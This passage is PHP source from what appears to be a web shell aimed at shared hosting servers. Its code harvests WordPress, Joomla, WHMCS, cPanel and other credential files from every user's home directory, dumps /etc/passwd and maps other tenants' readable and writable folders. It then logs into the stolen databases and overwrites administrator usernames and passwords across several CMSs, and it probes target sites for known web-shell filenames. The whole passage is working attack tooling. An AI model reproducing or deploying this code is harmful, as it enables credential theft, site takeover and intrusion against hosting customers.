					"/home/$user_tkc/public_html/Wp/wp-config.php" => "WordPressWp",
					"/home/$user_tkc/public_html/wp/wp-config.php" => "WordPressWp",
					"/home/$user_tkc/public_html/WP/wp-config.php" => "WordPressWP",
					"/home/$user_tkc/public_html/portal/wp-config.php" => "WordPressPortal",
					"/home/$user_tkc/public_html/PORTAL/wp-config.php" => "WordPressPortal",
					"/home/$user_tkc/public_html/Portal/wp-config.php" => "WordPressPortal",
										"/home1/$user_tkc/.my.cnf" => "cpanel",
					"/home1/$user_tkc/.accesshash" => "WHM-accesshash",
					"/home1/$user_tkc/public_html/bw-configs/config.ini" => "BosWeb",
					"/home1/$user_tkc/public_html/config/koneksi.php" => "Lokomedia",
					"/home1/$user_tkc/public_html/lokomedia/config/koneksi.php" => "Lokomedia",
					"/home1/$user_tkc/public_html/clientarea/configuration.php" => "WHMCS",				
					"/home1/$user_tkc/public_html/whmcs/configuration.php" => "WHMCS",
					"/home1/$user_tkc/public_html/forum/config.php" => "phpBB",
					"/home1/$user_tkc/public_html/sites/default/settings.php" => "Drupal",
					"/home1/$user_tkc/public_html/config/settings.inc.php" => "PrestaShop",
					"/home1/$user_tkc/public_html/app/etc/local.xml" => "Magento",
					"/home1/$user_tkc/public_html/admin/config.php" => "OpenCart",
					"/home1/$user_tkc/public_html/slconfig.php" => "Sitelok",
					"/home1/$user_tkc/public_html/application/config/database.php" => "Ellislab",					
					"/home1/$user_tkc/public_html/whm/configuration.php" => "WHMCS",
					"/home1/$user_tkc/public_html/whmc/WHM/configuration.ph" => "WHMC",
					"/home1/$user_tkc/public_html/central/configuration.php" => "WHM Central",
					"/home1/$user_tkc/public_html/whm/WHMCS/configuration.php" => "WHMCS",
					"/home1/$user_tkc/public_html/whm/whmcs/configuration.php" => "WHMCS",
					"/home1/$user_tkc/public_html/submitticket.php" => "WHMCS",										
					"/home1/$user_tkc/public_html/configuration.php" => "Joomla",					
					"/home1/$user_tkc/public_html/Joomla/configuration.php" => "JoomlaJoomla",
					"/home1/$user_tkc/public_html/joomla/configuration.php" => "JoomlaJoomla",
					"/home1/$user_tkc/public_html/JOOMLA/configuration.php" => "JoomlaJoomla",		
					"/home1/$user_tkc/public_html/Home/configuration.php" => "JoomlaHome",
					"/home1/$user_tkc/public_html/HOME/configuration.php" => "JoomlaHome",
					"/home1/$user_tkc/public_html/home/configuration.php" => "JoomlaHome",
					"/home1/$user_tkc/public_html/NEW/configuration.php" => "JoomlaNew",
					"/home1/$user_tkc/public_html/New/configuration.php" => "JoomlaNew",
					"/home1/$user_tkc/public_html/Wp/configuration.php" => "JoomlaWp",
					"/home1/$user_tkc/public_html/wp/configuration.php" => "JoomlaWp",
					"/home1/$user_tkc/public_html/WP/configuration.php" => "JoomlaWP",
					"/home1/$user_tkc/public_html/portal/configuration.php" => "JoomlaPortal",
					"/home1/$user_tkc/public_html/PORTAL/configuration.php" => "JoomlaPortal",
					"/home1/$user_tkc/public_html/Portal/configuration.php" => "JoomlaPortal",					
					"/home1/$user_tkc/public_html/wp-config.php" => "WordPress",
					"/home1/$user_tkc/public_html/wordpress/wp-config.php" => "WordPressWordpress",
					"/home1/$user_tkc/public_html/Wordpress/wp-config.php" => "WordPressWordpress",
					"/home1/$user_tkc/public_html/WORDPRESS/wp-config.php" => "WordPressWordpress",		
					"/home1/$user_tkc/public_html/Home/wp-config.php" => "WordPressHome",
					"/home1/$user_tkc/public_html/HOME/wp-config.php" => "WordPressHome",
					"/home1/$user_tkc/public_html/home/wp-config.php" => "WordPressHome",
					"/home1/$user_tkc/public_html/NEW/wp-config.php" => "WordPressNew",
					"/home1/$user_tkc/public_html/New/wp-config.php" => "WordPressNew",
					"/home1/$user_tkc/public_html/new/wp-config.php" => "WordPressNew",
					"/home1/$user_tkc/public_html/News/wp-config.php" => "WordPressNews",
					"/home1/$user_tkc/public_html/NEWS/wp-config.php" => "WordPressNews",
					"/home1/$user_tkc/public_html/news/wp-config.php" => "WordPressNews",
					"/home1/$user_tkc/public_html/blog/wp-config.php" => "WordPressBlog",
					"/home1/$user_tkc/public_html/Blogs/wp-config.php" => "WordPressBlogs",
					"/home1/$user_tkc/public_html/blogs/wp-config.php" => "WordPressBlogs",
					"/home1/$user_tkc/public_html/beta/wp-config.php" => "WordPressBeta",
					"/home1/$user_tkc/public_html/Beta/wp-config.php" => "WordPressBeta",
					"/home1/$user_tkc/public_html/press/wp-config.php" => "WordPressPress",
					"/home1/$user_tkc/public_html/Wp/wp-config.php" => "WordPressWp",
					"/home1/$user_tkc/public_html/wp/wp-config.php" => "WordPressWp",
					"/home1/$user_tkc/public_html/WP/wp-config.php" => "WordPressWP",
					"/home1/$user_tkc/public_html/portal/wp-config.php" => "WordPressPortal",
					"/home1/$user_tkc/public_html/PORTAL/wp-config.php" => "WordPressPortal",
					"/home1/$user_tkc/public_html/Portal/wp-config.php" => "WordPressPortal",
										"/home2/$user_tkc/.my.cnf" => "cpanel",
					"/home2/$user_tkc/.accesshash" => "WHM-accesshash",
					"/home2/$user_tkc/public_html/bw-configs/config.ini" => "BosWeb",
					"/home2/$user_tkc/public_html/config/koneksi.php" => "Lokomedia",
					"/home2/$user_tkc/public_html/lokomedia/config/koneksi.php" => "Lokomedia",
					"/home2/$user_tkc/public_html/clientarea/configuration.php" => "WHMCS",				
					"/home2/$user_tkc/public_html/whmcs/configuration.php" => "WHMCS",
					"/home2/$user_tkc/public_html/forum/config.php" => "phpBB",
					"/home2/$user_tkc/public_html/sites/default/settings.php" => "Drupal",
					"/home2/$user_tkc/public_html/config/settings.inc.php" => "PrestaShop",
					"/home2/$user_tkc/public_html/app/etc/local.xml" => "Magento",
					"/home2/$user_tkc/public_html/admin/config.php" => "OpenCart",
					"/home2/$user_tkc/public_html/slconfig.php" => "Sitelok",
					"/home2/$user_tkc/public_html/application/config/database.php" => "Ellislab",					
					"/home2/$user_tkc/public_html/whm/configuration.php" => "WHMCS",
					"/home2/$user_tkc/public_html/whmc/WHM/configuration.ph" => "WHMC",
					"/home2/$user_tkc/public_html/central/configuration.php" => "WHM Central",
					"/home2/$user_tkc/public_html/whm/WHMCS/configuration.php" => "WHMCS",
					"/home2/$user_tkc/public_html/whm/whmcs/configuration.php" => "WHMCS",
					"/home2/$user_tkc/public_html/submitticket.php" => "WHMCS",										
					"/home2/$user_tkc/public_html/configuration.php" => "Joomla",					
					"/home2/$user_tkc/public_html/Joomla/configuration.php" => "JoomlaJoomla",
					"/home2/$user_tkc/public_html/joomla/configuration.php" => "JoomlaJoomla",
					"/home2/$user_tkc/public_html/JOOMLA/configuration.php" => "JoomlaJoomla",		
					"/home2/$user_tkc/public_html/Home/configuration.php" => "JoomlaHome",
					"/home2/$user_tkc/public_html/wp-config.php" => "WordPress",
					"/home2/$user_tkc/public_html/wordpress/wp-config.php" => "WordPressWordpress",
					"/home2/$user_tkc/public_html/Wordpress/wp-config.php" => "WordPressWordpress",
					"/home2/$user_tkc/public_html/WORDPRESS/wp-config.php" => "WordPressWordpress",		
					"/home2/$user_tkc/public_html/Home/wp-config.php" => "WordPressHome",
					"/home2/$user_tkc/public_html/HOME/wp-config.php" => "WordPressHome",
					"/home2/$user_tkc/public_html/home/wp-config.php" => "WordPressHome",
					"/home2/$user_tkc/public_html/main/wp-config.php" => "WordPressMain",
					"/home2/$user_tkc/public_html/Blog/wp-config.php" => "WordPressBlog",
					"/home2/$user_tkc/public_html/BLOG/wp-config.php" => "WordPressBlog",
					"/home2/$user_tkc/public_html/blog/wp-config.php" => "WordPressBlog",
					"/home2/$user_tkc/public_html/Blogs/wp-config.php" => "WordPressBlogs",
					"/home2/$user_tkc/public_html/press/wp-config.php" => "WordPressPress",
					"/home2/$user_tkc/public_html/Wp/wp-config.php" => "WordPressWp",
					"/home2/$user_tkc/public_html/wp/wp-config.php" => "WordPressWp",
					"/home2/$user_tkc/public_html/WP/wp-config.php" => "WordPressWP",
					"/home2/$user_tkc/public_html/portal/wp-config.php" => "WordPressPortal",
					"/home2/$user_tkc/public_html/PORTAL/wp-config.php" => "WordPressPortal",
					"/home2/$user_tkc/public_html/Portal/wp-config.php" => "WordPressPortal",
					"/home3/$user_tkc/.my.cnf" => "cpanel",
					"/home3/$user_tkc/.accesshash" => "WHM-accesshash",
					"/home3/$user_tkc/public_html/bw-configs/config.ini" => "BosWeb",
					"/home3/$user_tkc/public_html/config/koneksi.php" => "Lokomedia",
					"/home3/$user_tkc/public_html/lokomedia/config/koneksi.php" => "Lokomedia",
					"/home3/$user_tkc/public_html/clientarea/configuration.php" => "WHMCS",				
					"/home3/$user_tkc/public_html/whmcs/configuration.php" => "WHMCS",
					"/home3/$user_tkc/public_html/forum/config.php" => "phpBB",
					"/home3/$user_tkc/public_html/application/config/database.php" => "Ellislab",					
					"/home3/$user_tkc/public_html/whm/configuration.php" => "WHMCS",
					"/home3/$user_tkc/public_html/whmc/WHM/configuration.ph" => "WHMC",
					"/home3/$user_tkc/public_html/central/configuration.php" => "WHM Central",
					"/home3/$user_tkc/public_html/whm/WHMCS/configuration.php" => "WHMCS",
					"/home3/$user_tkc/public_html/whm/whmcs/configuration.php" => "WHMCS",
					"/home3/$user_tkc/public_html/submitticket.php" => "WHMCS",										
					"/home3/$user_tkc/public_html/configuration.php" => "Joomla",					
					"/home3/$user_tkc/public_html/Joomla/configuration.php" => "JoomlaJoomla",
					"/home3/$user_tkc/public_html/joomla/configuration.php" => "JoomlaJoomla",
					"/home3/$user_tkc/public_html/JOOMLA/configuration.php" => "JoomlaJoomla",		
					"/home3/$user_tkc/public_html/Home/configuration.php" => "JoomlaHome",	
					"/home3/$user_tkc/public_html/wp-config.php" => "WordPress",
					"/home3/$user_tkc/public_html/wordpress/wp-config.php" => "WordPressWordpress",
					"/home3/$user_tkc/public_html/cms/wp-config.php" => "WordPressCms",
					"/home3/$user_tkc/public_html/Main/wp-config.php" => "WordPressMain",
					"/home3/$user_tkc/public_html/MAIN/wp-config.php" => "WordPressMain",
					"/home3/$user_tkc/public_html/main/wp-config.php" => "WordPressMain",
					"/home3/$user_tkc/public_html/Blog/wp-config.php" => "WordPressBlog",
					"/home3/$user_tkc/public_html/BLOG/wp-config.php" => "WordPressBlog",
					"/home3/$user_tkc/public_html/blog/wp-config.php" => "WordPressBlog",
						);	
					foreach($grab_config as $config => $nama_config) {
						$ambil_config = file_get_contents($config);
						if($ambil_config == '') {
						} else {
							$file_config = fopen("files_config/$user_tkc-$nama_config.txt","w");
							fputs($file_config,$ambil_config);
						}
					}
				}		
			}
			echo "<center><a href='?dir=$dir/files_config'><font color=lime>Done</font></a></center>";
			}else{
				
		echo "<form method=\"post\" action=\"\"><center>etc/passw ( Error ? <a href='?dir=$dir&do=passwbypass'>Bypass Here</a> )<br><textarea name=\"passwd\" class='area' rows='15' cols='60'>\n";
		echo file_get_contents('/etc/passwd'); 
		echo "</textarea><br><input type=\"submit\" value=\"GassPoll\"></td></tr></center>\n";
        }
} elseif($_GET['do'] == 'jumping') {
	$i = 0;
	echo "<pre><div class='margin: 5px auto;'>";
	$etc = fopen("/etc/passwd", "r");
	while($passwd = fgets($etc)) {
		if($passwd == '' || !$etc) {
			echo "<font color=red>Can't read /etc/passwd</font>";
		} else {
			preg_match_all('/(.*?):x:/', $passwd, $user_jumping);
			foreach($user_jumping[1] as $user_idx_jump) {
				$user_jumping_dir = "/home/$user_idx_jump/public_html";
				if(is_readable($user_jumping_dir)) {
					$i++;
					$jrw = "[<font color=lime>R</font>] <a href='?dir=$user_jumping_dir'><font color=gold>$user_jumping_dir</font></a><br>";
					if(is_writable($user_jumping_dir)) {
						$jrw = "[<font color=lime>RW</font>] <a href='?dir=$user_jumping_dir'><font color=gold>$user_jumping_dir</font></a><br>";
					}
					echo $jrw;
					$domain_jump = file_get_contents("/etc/named.conf");	
					if($domain_jump == '') {
						echo " => ( <font color=red>gabisa ambil nama domain nya</font> )<br>";
					} else {
						preg_match_all("#/var/named/(.*?).db#", $domain_jump, $domains_jump);
						foreach($domains_jump[1] as $dj) {
							$user_jumping_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
							$user_jumping_url = $user_jumping_url['name'];
							if($user_jumping_url == $user_idx_jump) {
								echo " => ( <u>$dj</u> )<br>";
								break;
							}
						}
					}
				}
			}
		}
	}
	if($i == 0) { 
	} else {
		echo "<br>Total ada ".$i." Kimcil di ".gethostbyname($_SERVER['HTTP_HOST'])."";
	}
	echo "</div></pre>";

} elseif($_GET['do'] == 'salto') {
	$i = 0;
	echo "<pre><div class='margin: 5px auto;'>";
	$etc = fopen("/etc/passwd", "r");
	while($passwd = fgets($etc)) {
		if($passwd == '' || !$etc) {
			echo "<font color=red>Can't read /etc/passwd</font>";
		} else {
			preg_match_all('/(.*?):x:/', $passwd, $user);
			foreach($user[1] as $users) {
				$user_dir = "/home/$users/fantastico_backups";
				if(is_readable($user_dir)) {
					$i++;
					$jrw = "[<font color=lime>R</font>] <a href='?dir=$user_dir'><font color=gold>/home/$users/fantastico_backups</font></a><br>";
					if(is_writable($user_dir)) {
						$jrw = "[<font color=lime>RW</font>] <a href='?dir=$user_dir'><font color=gold>/home/$users/fantastico_backups</font></a><br>";
					}
					echo $jrw;
					$domain_jump = file_get_contents("/etc/named.conf");	
					if($domain_jump == '') {
						echo " => ( <font color=red>gabisa ambil nama domain nya</font> )<br>";
					} else {
						preg_match_all("#/var/named/(.*?).db#", $domain_jump, $domains_jump);
						foreach($domains_jump[1] as $dj) {
							$user_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
							$user_url = $user_url['name'];
							if($user_url == $users) {
								echo " => ( <u>$dj</u> )<br>";
								break;
							}
						}
					}
				}
			}
		}
	}
	if($i == 0) { 
	} else {
		echo "<br>Total ada ".$i." Kamar di ".gethostbyname($_SERVER['HTTP_HOST'])."";
	}
	echo "</div></pre>";
	
} elseif($_GET['do'] == 'backup') {
	$i = 0;
	echo "<pre><div class='margin: 5px auto;'>";
	$etc = fopen("/etc/passwd", "r");
	while($passwd = fgets($etc)) {
		if($passwd == '' || !$etc) {
			echo "<font color=red>Can't read /etc/passwd</font>";
		} else {
			preg_match_all('/(.*?):x:/', $passwd, $user);
			foreach($user[1] as $users) {
				$user_dir = "/home/$users/backup";
				if(is_readable($user_dir)) {
					$i++;
					$jrw = "[<font color=lime>R</font>] <a href='?dir=$user_dir'><font color=gold>/home/$users/backup</font></a><br>";
					if(is_writable($user_dir)) {
						$jrw = "[<font color=lime>RW</font>] <a href='?dir=$user_dir'><font color=gold>/home/$users/backup</font></a><br>";
					}
					echo $jrw;
					$domain_jump = file_get_contents("/etc/named.conf");	
					if($domain_jump == '') {
						echo " => ( <font color=red>gabisa ambil nama domain nya</font> )<br>";
					} else {
						preg_match_all("#/var/named/(.*?).db#", $domain_jump, $domains_jump);
						foreach($domains_jump[1] as $dj) {
							$user_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
							$user_url = $user_url['name'];
							if($user_url == $users) {
								echo " => ( <u>$dj</u> )<br>";
								break;
							}
						}
					}
				}
			}
		}
	}
	if($i == 0) { 
	} else {
		echo "<br>Total ada ".$i." Kamar di ".gethostbyname($_SERVER['HTTP_HOST'])."";
	}
	echo "</div></pre>";
	
} elseif($_GET['do'] == 'backups') {
	$i = 0;
	echo "<pre><div class='margin: 5px auto;'>";
	$etc = fopen("/etc/passwd", "r");
	while($passwd = fgets($etc)) {
		if($passwd == '' || !$etc) {
			echo "<font color=red>Can't read /etc/passwd</font>";
		} else {
			preg_match_all('/(.*?):x:/', $passwd, $user);
			foreach($user[1] as $users) {
				$user_dir = "/home/$users/backups";
				if(is_readable($user_dir)) {
					$i++;
					$jrw = "[<font color=lime>R</font>] <a href='?dir=$user_dir'><font color=gold>/home/$users/backups</font></a><br>";
					if(is_writable($user_dir)) {
						$jrw = "[<font color=lime>RW</font>] <a href='?dir=$user_dir'><font color=gold>/home/$users/backups</font></a><br>";
					}
					echo $jrw;
					$domain_jump = file_get_contents("/etc/named.conf");	
					if($domain_jump == '') {
						echo " => ( <font color=red>gabisa ambil nama domain nya</font> )<br>";
					} else {
						preg_match_all("#/var/named/(.*?).db#", $domain_jump, $domains_jump);
						foreach($domains_jump[1] as $dj) {
							$user_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
							$user_url = $user_url['name'];
							if($user_url == $users) {
								echo " => ( <u>$dj</u> )<br>";
								break;
							}
						}
					}
				}
			}
		}
	}
	if($i == 0) { 
	} else {
		echo "<br>Total ada ".$i." Kamar di ".gethostbyname($_SERVER['HTTP_HOST'])."";
	}
	echo "</div></pre>";
} elseif($_GET['do'] == 'auto_edit_user') {
	if($_POST['hajar']) {
		if(strlen($_POST['pass_baru']) < 6 OR strlen($_POST['user_baru']) < 6) {
			echo "username atau password harus lebih dari 6 karakter";
		} else {
			$user_baru = $_POST['user_baru'];
			$pass_baru = md5($_POST['pass_baru']);
			$conf = $_POST['config_dir'];
			$scan_conf = scandir($conf);
			foreach($scan_conf as $file_conf) {
				if(!is_file("$conf/$file_conf")) continue;
				$config = file_get_contents("$conf/$file_conf");
				if(preg_match("/JConfig|joomla/",$config)) {
					$dbhost = ambilkata($config,"host = '","'");
					$dbuser = ambilkata($config,"user = '","'");
					$dbpass = ambilkata($config,"password = '","'");
					$dbname = ambilkata($config,"db = '","'");
					$dbprefix = ambilkata($config,"dbprefix = '","'");
					$prefix = $dbprefix."users";
					$conn = mysql_connect($dbhost,$dbuser,$dbpass);
					$db = mysql_select_db($dbname);
					$q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
					$result = mysql_fetch_array($q);
					$id = $result['id'];
					$site = ambilkata($config,"sitename = '","'");
					$update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE id='$id'");
					echo "Config => ".$file_conf."<br>";
					echo "CMS => Joomla<br>";
					if($site == '') {
						echo "Sitename => <font color=red>error, gabisa ambil nama domain nya</font><br>";
					} else {
						echo "Sitename => $site<br>";
					}
					if(!$update OR !$conn OR !$db) {
						echo "Status => <font color=red>".mysql_error()."</font><br><br>";
					} else {
						echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
					}
					mysql_close($conn);
				} elseif(preg_match("/WordPress/",$config)) {
					$dbhost = ambilkata($config,"DB_HOST', '","'");
					$dbuser = ambilkata($config,"DB_USER', '","'");
					$dbpass = ambilkata($config,"DB_PASSWORD', '","'");
					$dbname = ambilkata($config,"DB_NAME', '","'");
					$dbprefix = ambilkata($config,"table_prefix  = '","'");
					$prefix = $dbprefix."users";
					$option = $dbprefix."options";
					$conn = mysql_connect($dbhost,$dbuser,$dbpass);
					$db = mysql_select_db($dbname);
					$q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
					$result = mysql_fetch_array($q);
					$id = $result[ID];
					$q2 = mysql_query("SELECT * FROM $option ORDER BY option_id ASC");
					$result2 = mysql_fetch_array($q2);
					$target = $result2[option_value];
					if($target == '') {
						$url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
					} else {
						$url_target = "Login => <a href='$target/wp-login.php' target='_blank'><u>$target/wp-login.php</u></a><br>";
					}
					$update = mysql_query("UPDATE $prefix SET user_login='$user_baru',user_pass='$pass_baru' WHERE id='$id'");
					echo "Config => ".$file_conf."<br>";
					echo "CMS => Wordpress<br>";
					echo $url_target;
					if(!$update OR !$conn OR !$db) {
						echo "Status => <font color=red>".mysql_error()."</font><br><br>";
					} else {
						echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
					}
					mysql_close($conn);
				} elseif(preg_match("/Magento|Mage_Core/",$config)) {
					$dbhost = ambilkata($config,"<host><![CDATA[","]]></host>");
					$dbuser = ambilkata($config,"<username><![CDATA[","]]></username>");
					$dbpass = ambilkata($config,"<password><![CDATA[","]]></password>");
					$dbname = ambilkata($config,"<dbname><![CDATA[","]]></dbname>");
					$dbprefix = ambilkata($config,"<table_prefix><![CDATA[","]]></table_prefix>");
					$prefix = $dbprefix."admin_user";
					$option = $dbprefix."core_config_data";
					$conn = mysql_connect($dbhost,$dbuser,$dbpass);
					$db = mysql_select_db($dbname);
					$q = mysql_query("SELECT * FROM $prefix ORDER BY user_id ASC");
					$result = mysql_fetch_array($q);
					$id = $result[user_id];
					$q2 = mysql_query("SELECT * FROM $option WHERE path='web/secure/base_url'");
					$result2 = mysql_fetch_array($q2);
					$target = $result2[value];
					if($target == '') {
						$url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
					} else {
						$url_target = "Login => <a href='$target/admin/' target='_blank'><u>$target/admin/</u></a><br>";
					}
					$update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE user_id='$id'");
					echo "Config => ".$file_conf."<br>";
					echo "CMS => Magento<br>";
					echo $url_target;
					if(!$update OR !$conn OR !$db) {
						echo "Status => <font color=red>".mysql_error()."</font><br><br>";
					} else {
						echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
					}
					mysql_close($conn);
				} elseif(preg_match("/HTTP_SERVER|HTTP_CATALOG|DIR_CONFIG|DIR_SYSTEM/",$config)) {
					$dbhost = ambilkata($config,"'DB_HOSTNAME', '","'");
					$dbuser = ambilkata($config,"'DB_USERNAME', '","'");
					$dbpass = ambilkata($config,"'DB_PASSWORD', '","'");
					$dbname = ambilkata($config,"'DB_DATABASE', '","'");
					$dbprefix = ambilkata($config,"'DB_PREFIX', '","'");
					$prefix = $dbprefix."user";
					$conn = mysql_connect($dbhost,$dbuser,$dbpass);
					$db = mysql_select_db($dbname);
					$q = mysql_query("SELECT * FROM $prefix ORDER BY user_id ASC");
					$result = mysql_fetch_array($q);
					$id = $result[user_id];
					$target = ambilkata($config,"HTTP_SERVER', '","'");
					if($target == '') {
						$url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
					} else {
						$url_target = "Login => <a href='$target' target='_blank'><u>$target</u></a><br>";
					}
					$update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE user_id='$id'");
					echo "Config => ".$file_conf."<br>";
					echo "CMS => OpenCart<br>";
					echo $url_target;
					if(!$update OR !$conn OR !$db) {
						echo "Status => <font color=red>".mysql_error()."</font><br><br>";
					} else {
						echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
					}
					mysql_close($conn);
				} elseif(preg_match("/panggil fungsi validasi xss dan injection/",$config)) {
					$dbhost = ambilkata($config,'server = "','"');
					$dbuser = ambilkata($config,'username = "','"');
					$dbpass = ambilkata($config,'password = "','"');
					$dbname = ambilkata($config,'database = "','"');
					$prefix = "users";
					$option = "identitas";
					$conn = mysql_connect($dbhost,$dbuser,$dbpass);
					$db = mysql_select_db($dbname);
					$q = mysql_query("SELECT * FROM $option ORDER BY id_identitas ASC");
					$result = mysql_fetch_array($q);
					$target = $result[alamat_website];
					if($target == '') {
						$target2 = $result[url];
						$url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
						if($target2 == '') {
							$url_target2 = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
						} else {
							$cek_login3 = file_get_contents("$target2/adminweb/");
							$cek_login4 = file_get_contents("$target2/lokomedia/adminweb/");
							if(preg_match("/CMS Lokomedia|Administrator/", $cek_login3)) {
								$url_target2 = "Login => <a href='$target2/adminweb' target='_blank'><u>$target2/adminweb</u></a><br>";
							} elseif(preg_match("/CMS Lokomedia|Lokomedia/", $cek_login4)) {
								$url_target2 = "Login => <a href='$target2/lokomedia/adminweb' target='_blank'><u>$target2/lokomedia/adminweb</u></a><br>";
							} else {
								$url_target2 = "Login => <a href='$target2' target='_blank'><u>$target2</u></a> [ <font color=red>gatau admin login nya dimana :p</font> ]<br>";
							}
						}
					} else {
						$cek_login = file_get_contents("$target/adminweb/");
						$cek_login2 = file_get_contents("$target/lokomedia/adminweb/");
						if(preg_match("/CMS Lokomedia|Administrator/", $cek_login)) {
							$url_target = "Login => <a href='$target/adminweb' target='_blank'><u>$target/adminweb</u></a><br>";
						} elseif(preg_match("/CMS Lokomedia|Lokomedia/", $cek_login2)) {
							$url_target = "Login => <a href='$target/lokomedia/adminweb' target='_blank'><u>$target/lokomedia/adminweb</u></a><br>";
						} else {
							$url_target = "Login => <a href='$target' target='_blank'><u>$target</u></a> [ <font color=red>gatau admin login nya dimana :p</font> ]<br>";
						}
					}
					$update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE level='admin'");
					echo "Config => ".$file_conf."<br>";
					echo "CMS => Lokomedia<br>";
					if(preg_match('/error, gabisa ambil nama domain nya/', $url_target)) {
						echo $url_target2;
					} else {
						echo $url_target;
					}
					if(!$update OR !$conn OR !$db) {
						echo "Status => <font color=red>".mysql_error()."</font><br><br>";
					} else {
						echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
					}
					mysql_close($conn);
				}
			}
		}
	} else {
		echo "<center>
		<h1>Auto Edit User Config</h1>
		<form method='post'>
		DIR Config: <br>
		<input type='text' size='50' name='config_dir' value='$dir'><br><br>
		Set User & Pass: <br>
		<input type='text' name='user_baru' value='heninoor27' placeholder='user_baru'><br>
		<input type='text' name='pass_baru' value='heninoor27' placeholder='pass_baru'><br>
		<input type='submit' name='hajar' value='Hajar!' style='width: 215px;'>
		</form>
		<span>NB: Tools ini work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span><br>
		";
	}
}elseif($_GET['do'] == 'shelscan') {
	echo'<center><h2>Shell Finder</h2>
<form action="" method="post">
<input type="text" size="50" name="traget" value="http://www.site.com/"/>
<br>
<input name="scan" value="Start Scaning"  style="width: 215px;" type="submit">
</form><br>';
if (isset($_POST["scan"])) {  
$url = $_POST['traget'];
echo "<br /><span class='start'>Scanning ".$url."<br /><br /></span>";
echo "Result :<br />";
$shells = array("WSO.php","dz.php","cpanel.php","cpn.php","sql.php","mysql.php","madspot.php","cp.php","cpbt.php","sYm.php",
"x.php","r99.php","lol.php","jo.php","wp.php","whmcs.php","shellz.php","d0main.php","d0mains.php","users.php",
"Cgishell.pl","killer.php","changeall.php","2.php","Sh3ll.php","dz0.php","dam.php","user.php","dom.php","whmcs.php",
"vb.zip","r00t.php","c99.php","gaza.php","1.php","wp.zip"."wp-content/plugins/disqus-comment-system/disqus.php",
"d0mains.php","wp-content/plugins/akismet/akismet.php","madspotshell.php","Sym.php","c22.php","c100.php",
"wp-content/plugins/akismet/admin.php#","wp-content/plugins/google-sitemap-generator/sitemap-core.php#",
"wp-content/plugins/akismet/widget.php#","Cpanel.php","zone-h.php","tmp/user.php","tmp/Sym.php","cp.php",
"tmp/madspotshell.php","tmp/root.php","tmp/whmcs.php","tmp/index.php","tmp/2.php","tmp/dz.php","tmp/cpn.php",
"tmp/changeall.php","tmp/Cgishell.pl","tmp/sql.php","tmp/admin.php","cliente/downloads/h4xor.php",
"whmcs/downloads/dz.php","L3b.php","d.php","tmp/d.php","tmp/L3b.php","wp-content/plugins/akismet/admin.php",
"templates/rhuk_milkyway/index.php","templates/beez/index.php","admin1.php","upload.php","up.php","vb.zip","vb.rar",
"admin2.asp","uploads.php","sa.php","sysadmins/","admin1/","administration/Sym.php","images/Sym.php",
"/r57.php","/wp-content/plugins/disqus-comment-system/disqus.php","/shell.php","/sa.php","/admin.php",
"/sa2.php","/2.php","/gaza.php","/up.php","/upload.php","/uploads.php","/templates/beez/index.php","shell.php","/amad.php",
"/t00.php","/dz.php","/site.rar","/Black.php","/site.tar.gz","/home.zip","/home.rar","/home.tar","/home.tar.gz",
"/forum.zip","/forum.rar","/forum.tar","/forum.tar.gz","/test.txt","/ftp.txt","/user.txt","/site.txt","/error_log","/error",
"/cpanel","/awstats","/site.sql","/vb.sql","/forum.sql","/backup.sql","/back.sql","/data.sql","wp.rar/",
"wp-content/plugins/disqus-comment-system/disqus.php","asp.aspx","/templates/beez/index.php","tmp/vaga.php",
"tmp/killer.php","whmcs.php","tmp/killer.php","tmp/domaine.pl","tmp/domaine.php","useradmin/",
"tmp/d0maine.php","d0maine.php","tmp/sql.php","tmp/dz1.php","dz1.php","forum.zip","Symlink.php","Symlink.pl", 
"forum.rar","joomla.zip","joomla.rar","wp.php","buck.sql","sysadmin.php","images/c99.php", "xd.php", "c100.php",
"spy.aspx","xd.php","tmp/xd.php","sym/root/home/","billing/killer.php","tmp/upload.php","tmp/admin.php",
"Server.php","tmp/uploads.php","tmp/up.php","Server/","wp-admin/c99.php","tmp/priv8.php","priv8.php","cgi.pl/", 
"tmp/cgi.pl","downloads/dom.php","templates/ja-helio-farsi/index.php","webadmin.html","admins.php",
"/wp-content/plugins/count-per-day/js/yc/d00.php", "admins/","admins.asp","admins.php","wp.zip","wso2.5.1","pasir.php","pasir2.php","up.php","cok.php","newfile.php","upl.php",".php","a.php","crot.php","kontol.php","hmei7.php","jembut.php","memek.php","tai.php","rabit.php","indoxploit.php","a.php","hemb.php","hack.php","galau.php","HsH.php","indoXploit.php","asu.php","wso.php","lol.php","idx.php","rabbit.php","1n73ction.php","k.php","mailer.php","mail.php","temp.php","c.php","d.php","IDB.php","indo.php","indonesia.php","semvak.php","ndasmu.php","cox.php","as.php","ad.php","aa.php","file.php","peju.php","asd.php","configs.php","ass.php","z.php");
foreach ($shells as $shell){
$headers = get_headers("$url$shell"); // 
if (eregi('200', $headers[0])) {
echo "<a href='$url$shell'>$url$shell</a> <span class='found'>Done :D</span><br /><br/><br/>"; // 
$dz = fopen('shells.txt', 'a+');
$suck = "$url$shell";
fwrite($dz, $suck."\n");
}
}
echo "Shell [ <a href='./shells.txt' target='_blank'>shells.txt</a> ]</span>";
}
	
}
